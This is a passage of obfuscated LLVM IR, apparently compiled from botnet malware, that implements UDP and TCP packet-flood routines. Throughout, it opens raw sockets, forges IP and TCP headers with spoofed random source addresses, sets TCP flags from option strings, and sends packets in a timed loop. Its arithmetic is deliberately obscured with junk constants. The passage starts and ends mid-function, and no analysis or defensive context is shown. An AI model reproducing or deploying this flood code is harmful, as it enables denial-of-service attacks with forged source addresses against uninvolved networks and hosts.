  %160 = bitcast i8* %99 to i16*
  %161 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  %163 = load i16, i16* %162, align 2
  %164 = zext i16 %163 to i32
  %165 = call zeroext i16 @csum(i16* %160, i32 %164)
  %166 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 7
  store i16 %165, i16* %167, align 2
  %168 = call i64 @time(i64* null) #5
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 %168, 1601333071635674292
  %172 = add i64 %171, %170
  %173 = sub i64 %172, 1601333071635674292
  %174 = add nsw i64 %168, %170
  %175 = trunc i64 %173 to i32
  store i32 %175, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %176

; <label>:176:                                    ; preds = %230, %229, %145
  br label %177

; <label>:177:                                    ; preds = %176
  %178 = load i32, i32* %15, align 4
  %179 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %180 = call i64 @sendto(i32 %178, i8* %99, i64 %96, i32 0, %struct.sockaddr* %179, i32 16)
  %181 = call i32 @rand_cmwc()
  %182 = trunc i32 %181 to i16
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.1* %184 to %struct.anon.2*
  %186 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %185, i32 0, i32 0
  store i16 %182, i16* %186, align 2
  %187 = load i32, i32* %8, align 4
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %189, label %191

; <label>:189:                                    ; preds = %177
  %190 = call i32 @rand_cmwc()
  br label %196

; <label>:191:                                    ; preds = %177
  %192 = load i32, i32* %8, align 4
  %193 = trunc i32 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #10
  %195 = zext i16 %194 to i32
  br label %196

; <label>:196:                                    ; preds = %191, %189
  %197 = phi i32 [ %190, %189 ], [ %195, %191 ]
  %198 = trunc i32 %197 to i16
  %199 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon.1* %200 to %struct.anon.2*
  %202 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %201, i32 0, i32 1
  store i16 %198, i16* %202, align 2
  %203 = call i32 @rand_cmwc()
  %204 = trunc i32 %203 to i16
  %205 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i32, i32* %18, align 4
  %208 = call i32 @getRandomIP(i32 %207)
  %209 = call i32 @htonl(i32 %208) #10
  %210 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = bitcast i8* %99 to i16*
  %213 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 2
  %215 = load i16, i16* %214, align 2
  %216 = zext i16 %215 to i32
  %217 = call zeroext i16 @csum(i16* %212, i32 %216)
  %218 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 7
  store i16 %217, i16* %219, align 2
  %220 = load i32, i32* %23, align 4
  %221 = load i32, i32* %14, align 4
  %222 = icmp eq i32 %220, %221
  br i1 %222, label %223, label %230

; <label>:223:                                    ; preds = %196
  %224 = call i64 @time(i64* null) #5
  %225 = load i32, i32* %22, align 4
  %226 = sext i32 %225 to i64
  %227 = icmp sgt i64 %224, %226
  br i1 %227, label %228, label %229

; <label>:228:                                    ; preds = %223
  br label %236

; <label>:229:                                    ; preds = %223
  store i32 0, i32* %23, align 4
  br label %176

; <label>:230:                                    ; preds = %196
  %231 = load i32, i32* %23, align 4
  %232 = add i32 %231, 1208892498
  %233 = add i32 %232, 1
  %234 = sub i32 %233, 1208892498
  %235 = add i32 %231, 1
  store i32 %234, i32* %23, align 4
  br label %176

; <label>:236:                                    ; preds = %228
  %237 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %237)
  br label %238

; <label>:238:                                    ; preds = %236, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %532

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %532

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %532

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %83

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub i32 0, %63
  %65 = add i32 32, %64
  %66 = sub nsw i32 32, %63
  %67 = shl i32 1, %65
  %68 = add i32 %67, -1373688044
  %69 = sub i32 %68, 1
  %70 = sub i32 %69, -1373688044
  %71 = sub nsw i32 %67, 1
  %72 = xor i32 %70, -1
  %73 = and i32 1845663606, %72
  %74 = xor i32 1845663606, -1
  %75 = and i32 %70, %74
  %76 = xor i32 -1, -1
  %77 = and i32 %76, 1845663606
  %78 = and i32 -1, %74
  %79 = or i32 %73, %75
  %80 = or i32 %77, %78
  %81 = xor i32 %79, %80
  %82 = xor i32 %70, -1
  store i32 %81, i32* %19, align 4
  br label %83

; <label>:83:                                     ; preds = %62, %61
  %84 = load i32, i32* %12, align 4
  %85 = sext i32 %84 to i64
  %86 = sub i64 0, %85
  %87 = sub i64 40, %86
  %88 = add i64 40, %85
  %89 = call i8* @llvm.stacksave()
  store i8* %89, i8** %20, align 8
  %90 = alloca i8, i64 %87, align 16
  %91 = bitcast i8* %90 to %struct.iphdr*
  store %struct.iphdr* %91, %struct.iphdr** %21, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %93 = bitcast %struct.iphdr* %92 to i8*
  %94 = getelementptr i8, i8* %93, i64 20
  %95 = bitcast i8* %94 to %struct.tcphdr*
  store %struct.tcphdr* %95, %struct.tcphdr** %22, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %98 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %97, i32 0, i32 0
  %99 = load i32, i32* %98, align 4
  %100 = load i32, i32* %19, align 4
  %101 = call i32 @getRandomIP(i32 %100)
  %102 = call i32 @htonl(i32 %101) #10
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 20, -2543670744933742062
  %106 = add i64 %105, %104
  %107 = add i64 %106, -2543670744933742062
  %108 = add i64 20, %104
  %109 = trunc i64 %107 to i32
  call void @makeIPPacket(%struct.iphdr* %96, i32 %99, i32 %102, i8 zeroext 6, i32 %109)
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %113 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %112, i32 0, i32 0
  %114 = bitcast %union.anon* %113 to %struct.anon.0*
  %115 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %114, i32 0, i32 0
  store i16 %111, i16* %115, align 4
  %116 = call i32 @rand_cmwc()
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon* %118 to %struct.anon.0*
  %120 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %119, i32 0, i32 2
  store i32 %116, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 3
  store i32 0, i32* %124, align 4
  %125 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %126 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %125, i32 0, i32 0
  %127 = bitcast %union.anon* %126 to %struct.anon.0*
  %128 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %127, i32 0, i32 4
  %129 = load i16, i16* %128, align 4
  %130 = xor i16 %129, -1
  %131 = xor i16 -241, -1
  %132 = xor i16 32074, -1
  %133 = or i16 %130, %131
  %134 = or i16 32074, %132
  %135 = xor i16 %133, -1
  %136 = and i16 %135, %134
  %137 = and i16 %129, -241
  %138 = xor i16 %136, -1
  %139 = xor i16 80, -1
  %140 = xor i16 27824, -1
  %141 = and i16 %138, 27824
  %142 = and i16 %136, %140
  %143 = and i16 %139, 27824
  %144 = and i16 80, %140
  %145 = or i16 %141, %142
  %146 = or i16 %143, %144
  %147 = xor i16 %145, %146
  %148 = or i16 %138, %139
  %149 = xor i16 %148, -1
  %150 = or i16 27824, %140
  %151 = and i16 %149, %150
  %152 = or i16 %147, %151
  %153 = or i16 %136, 80
  store i16 %152, i16* %128, align 4
  %154 = load i8*, i8** %11, align 8
  %155 = call i32 @strcmp(i8* %154, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #9
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %283, label %157

; <label>:157:                                    ; preds = %83
  %158 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %159 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %158, i32 0, i32 0
  %160 = bitcast %union.anon* %159 to %struct.anon.0*
  %161 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %160, i32 0, i32 4
  %162 = load i16, i16* %161, align 4
  %163 = xor i16 -513, -1
  %164 = xor i16 %162, %163
  %165 = and i16 %164, %162
  %166 = and i16 %162, -513
  %167 = xor i16 %165, -1
  %168 = xor i16 512, -1
  %169 = xor i16 -312, -1
  %170 = and i16 %167, -312
  %171 = and i16 %165, %169
  %172 = and i16 %168, -312
  %173 = and i16 512, %169
  %174 = or i16 %170, %171
  %175 = or i16 %172, %173
  %176 = xor i16 %174, %175
  %177 = or i16 %167, %168
  %178 = xor i16 %177, -1
  %179 = or i16 -312, %169
  %180 = and i16 %178, %179
  %181 = or i16 %176, %180
  %182 = or i16 %165, 512
  store i16 %181, i16* %161, align 4
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon* %184 to %struct.anon.0*
  %186 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = xor i16 -1025, -1
  %189 = xor i16 %187, %188
  %190 = and i16 %189, %187
  %191 = and i16 %187, -1025
  %192 = and i16 %190, 1024
  %193 = xor i16 %190, 1024
  %194 = or i16 %192, %193
  %195 = or i16 %190, 1024
  store i16 %194, i16* %186, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon* %197 to %struct.anon.0*
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = xor i16 %200, -1
  %202 = xor i16 -257, -1
  %203 = xor i16 12541, -1
  %204 = or i16 %201, %202
  %205 = or i16 12541, %203
  %206 = xor i16 %204, -1
  %207 = and i16 %206, %205
  %208 = and i16 %200, -257
  %209 = xor i16 %207, -1
  %210 = xor i16 256, -1
  %211 = xor i16 14307, -1
  %212 = and i16 %209, 14307
  %213 = and i16 %207, %211
  %214 = and i16 %210, 14307
  %215 = and i16 256, %211
  %216 = or i16 %212, %213
  %217 = or i16 %214, %215
  %218 = xor i16 %216, %217
  %219 = or i16 %209, %210
  %220 = xor i16 %219, -1
  %221 = or i16 14307, %211
  %222 = and i16 %220, %221
  %223 = or i16 %218, %222
  %224 = or i16 %207, 256
  store i16 %223, i16* %199, align 4
  %225 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 0
  %227 = bitcast %union.anon* %226 to %struct.anon.0*
  %228 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = xor i16 %229, -1
  %231 = xor i16 -4097, -1
  %232 = xor i16 291, -1
  %233 = or i16 %230, %231
  %234 = or i16 291, %232
  %235 = xor i16 %233, -1
  %236 = and i16 %235, %234
  %237 = and i16 %229, -4097
  %238 = xor i16 %236, -1
  %239 = xor i16 4096, -1
  %240 = xor i16 20874, -1
  %241 = and i16 %238, 20874
  %242 = and i16 %236, %240
  %243 = and i16 %239, 20874
  %244 = and i16 4096, %240
  %245 = or i16 %241, %242
  %246 = or i16 %243, %244
  %247 = xor i16 %245, %246
  %248 = or i16 %238, %239
  %249 = xor i16 %248, -1
  %250 = or i16 20874, %240
  %251 = and i16 %249, %250
  %252 = or i16 %247, %251
  %253 = or i16 %236, 4096
  store i16 %252, i16* %228, align 4
  %254 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon* %255 to %struct.anon.0*
  %257 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = xor i16 %258, -1
  %260 = xor i16 -2049, -1
  %261 = xor i16 8955, -1
  %262 = or i16 %259, %260
  %263 = or i16 8955, %261
  %264 = xor i16 %262, -1
  %265 = and i16 %264, %263
  %266 = and i16 %258, -2049
  %267 = xor i16 %265, -1
  %268 = xor i16 2048, -1
  %269 = xor i16 -28639, -1
  %270 = and i16 %267, -28639
  %271 = and i16 %265, %269
  %272 = and i16 %268, -28639
  %273 = and i16 2048, %269
  %274 = or i16 %270, %271
  %275 = or i16 %272, %273
  %276 = xor i16 %274, %275
  %277 = or i16 %267, %268
  %278 = xor i16 %277, -1
  %279 = or i16 -28639, %269
  %280 = and i16 %278, %279
  %281 = or i16 %276, %280
  %282 = or i16 %265, 2048
  store i16 %281, i16* %257, align 4
  br label %415

; <label>:283:                                    ; preds = %83
  %284 = load i8*, i8** %11, align 8
  %285 = call i8* @strtok(i8* %284, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0)) #5
  store i8* %285, i8** %23, align 8
  br label %286

; <label>:286:                                    ; preds = %412, %283
  %287 = load i8*, i8** %23, align 8
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %414

; <label>:289:                                    ; preds = %286
  %290 = load i8*, i8** %23, align 8
  %291 = call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.104, i32 0, i32 0)) #9
  %292 = icmp ne i32 %291, 0
  br i1 %292, label %319, label %293

; <label>:293:                                    ; preds = %289
  %294 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon* %295 to %struct.anon.0*
  %297 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = xor i16 -513, -1
  %300 = xor i16 %298, %299
  %301 = and i16 %300, %298
  %302 = and i16 %298, -513
  %303 = xor i16 %301, -1
  %304 = xor i16 512, -1
  %305 = xor i16 7806, -1
  %306 = and i16 %303, 7806
  %307 = and i16 %301, %305
  %308 = and i16 %304, 7806
  %309 = and i16 512, %305
  %310 = or i16 %306, %307
  %311 = or i16 %308, %309
  %312 = xor i16 %310, %311
  %313 = or i16 %303, %304
  %314 = xor i16 %313, -1
  %315 = or i16 7806, %305
  %316 = and i16 %314, %315
  %317 = or i16 %312, %316
  %318 = or i16 %301, 512
  store i16 %317, i16* %297, align 4
  br label %412

; <label>:319:                                    ; preds = %289
  %320 = load i8*, i8** %23, align 8
  %321 = call i32 @strcmp(i8* %320, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #9
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %337, label %323

; <label>:323:                                    ; preds = %319
  %324 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 0
  %326 = bitcast %union.anon* %325 to %struct.anon.0*
  %327 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %326, i32 0, i32 4
  %328 = load i16, i16* %327, align 4
  %329 = xor i16 -1025, -1
  %330 = xor i16 %328, %329
  %331 = and i16 %330, %328
  %332 = and i16 %328, -1025
  %333 = and i16 %331, 1024
  %334 = xor i16 %331, 1024
  %335 = or i16 %333, %334
  %336 = or i16 %331, 1024
  store i16 %335, i16* %327, align 4
  br label %411

; <label>:337:                                    ; preds = %319
  %338 = load i8*, i8** %23, align 8
  %339 = call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #9
  %340 = icmp ne i32 %339, 0
  br i1 %340, label %355, label %341

; <label>:341:                                    ; preds = %337
  %342 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon* %343 to %struct.anon.0*
  %345 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = xor i16 -257, -1
  %348 = xor i16 %346, %347
  %349 = and i16 %348, %346
  %350 = and i16 %346, -257
  %351 = and i16 %349, 256
  %352 = xor i16 %349, 256
  %353 = or i16 %351, %352
  %354 = or i16 %349, 256
  store i16 %353, i16* %345, align 4
  br label %410

; <label>:355:                                    ; preds = %337
  %356 = load i8*, i8** %23, align 8
  %357 = call i32 @strcmp(i8* %356, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #9
  %358 = icmp ne i32 %357, 0
  br i1 %358, label %389, label %359

; <label>:359:                                    ; preds = %355
  %360 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  %362 = bitcast %union.anon* %361 to %struct.anon.0*
  %363 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %362, i32 0, i32 4
  %364 = load i16, i16* %363, align 4
  %365 = xor i16 %364, -1
  %366 = xor i16 -4097, -1
  %367 = xor i16 -27207, -1
  %368 = or i16 %365, %366
  %369 = or i16 -27207, %367
  %370 = xor i16 %368, -1
  %371 = and i16 %370, %369
  %372 = and i16 %364, -4097
  %373 = xor i16 %371, -1
  %374 = xor i16 4096, -1
  %375 = xor i16 -32434, -1
  %376 = and i16 %373, -32434
  %377 = and i16 %371, %375
  %378 = and i16 %374, -32434
  %379 = and i16 4096, %375
  %380 = or i16 %376, %377
  %381 = or i16 %378, %379
  %382 = xor i16 %380, %381
  %383 = or i16 %373, %374
  %384 = xor i16 %383, -1
  %385 = or i16 -32434, %375
  %386 = and i16 %384, %385
  %387 = or i16 %382, %386
  %388 = or i16 %371, 4096
  store i16 %387, i16* %363, align 4
  br label %409

; <label>:389:                                    ; preds = %355
  %390 = load i8*, i8** %23, align 8
  %391 = call i32 @strcmp(i8* %390, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %392 = icmp ne i32 %391, 0
  br i1 %392, label %407, label %393

; <label>:393:                                    ; preds = %389
  %394 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon* %395 to %struct.anon.0*
  %397 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %396, i32 0, i32 4
  %398 = load i16, i16* %397, align 4
  %399 = xor i16 -2049, -1
  %400 = xor i16 %398, %399
  %401 = and i16 %400, %398
  %402 = and i16 %398, -2049
  %403 = and i16 %401, 2048
  %404 = xor i16 %401, 2048
  %405 = or i16 %403, %404
  %406 = or i16 %401, 2048
  store i16 %405, i16* %397, align 4
  br label %408

; <label>:407:                                    ; preds = %389
  br label %408

; <label>:408:                                    ; preds = %407, %393
  br label %409

; <label>:409:                                    ; preds = %408, %359
  br label %410

; <label>:410:                                    ; preds = %409, %341
  br label %411

; <label>:411:                                    ; preds = %410, %323
  br label %412

; <label>:412:                                    ; preds = %411, %293
  %413 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %413, i8** %23, align 8
  br label %286

; <label>:414:                                    ; preds = %286
  br label %415

; <label>:415:                                    ; preds = %414, %157
  %416 = call i32 @rand_cmwc()
  %417 = trunc i32 %416 to i16
  %418 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon* %419 to %struct.anon.0*
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 5
  store i16 %417, i16* %421, align 2
  %422 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i32 0, i32 0
  %424 = bitcast %union.anon* %423 to %struct.anon.0*
  %425 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %424, i32 0, i32 6
  store i16 0, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 0
  %428 = bitcast %union.anon* %427 to %struct.anon.0*
  %429 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %428, i32 0, i32 7
  store i16 0, i16* %429, align 2
  %430 = load i32, i32* %9, align 4
  %431 = icmp eq i32 %430, 0
  br i1 %431, label %432, label %434

; <label>:432:                                    ; preds = %415
  %433 = call i32 @rand_cmwc()
  br label %439

; <label>:434:                                    ; preds = %415
  %435 = load i32, i32* %9, align 4
  %436 = trunc i32 %435 to i16
  %437 = call zeroext i16 @htons(i16 zeroext %436) #10
  %438 = zext i16 %437 to i32
  br label %439

; <label>:439:                                    ; preds = %434, %432
  %440 = phi i32 [ %433, %432 ], [ %438, %434 ]
  %441 = trunc i32 %440 to i16
  %442 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon* %443 to %struct.anon.0*
  %445 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %444, i32 0, i32 1
  store i16 %441, i16* %445, align 2
  %446 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %447 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %448 = call zeroext i16 @tcpcsum(%struct.iphdr* %446, %struct.tcphdr* %447)
  %449 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %450 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %449, i32 0, i32 0
  %451 = bitcast %union.anon* %450 to %struct.anon.0*
  %452 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %451, i32 0, i32 6
  store i16 %448, i16* %452, align 4
  %453 = bitcast i8* %90 to i16*
  %454 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 2
  %456 = load i16, i16* %455, align 2
  %457 = zext i16 %456 to i32
  %458 = call zeroext i16 @csum(i16* %453, i32 %457)
  %459 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 7
  store i16 %458, i16* %460, align 2
  %461 = call i64 @time(i64* null) #5
  %462 = load i32, i32* %10, align 4
  %463 = sext i32 %462 to i64
  %464 = sub i64 %461, -223588987010555894
  %465 = add i64 %464, %463
  %466 = add i64 %465, -223588987010555894
  %467 = add nsw i64 %461, %463
  %468 = trunc i64 %466 to i32
  store i32 %468, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %469

; <label>:469:                                    ; preds = %523, %522, %439
  br label %470

; <label>:470:                                    ; preds = %469
  %471 = load i32, i32* %17, align 4
  %472 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %473 = call i64 @sendto(i32 %471, i8* %90, i64 %87, i32 0, %struct.sockaddr* %472, i32 16)
  %474 = load i32, i32* %19, align 4
  %475 = call i32 @getRandomIP(i32 %474)
  %476 = call i32 @htonl(i32 %475) #10
  %477 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 8
  store i32 %476, i32* %478, align 4
  %479 = call i32 @rand_cmwc()
  %480 = trunc i32 %479 to i16
  %481 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 3
  store i16 %480, i16* %482, align 4
  %483 = call i32 @rand_cmwc()
  %484 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 0
  %486 = bitcast %union.anon* %485 to %struct.anon.0*
  %487 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %486, i32 0, i32 2
  store i32 %483, i32* %487, align 4
  %488 = call i32 @rand_cmwc()
  %489 = trunc i32 %488 to i16
  %490 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 0
  %492 = bitcast %union.anon* %491 to %struct.anon.0*
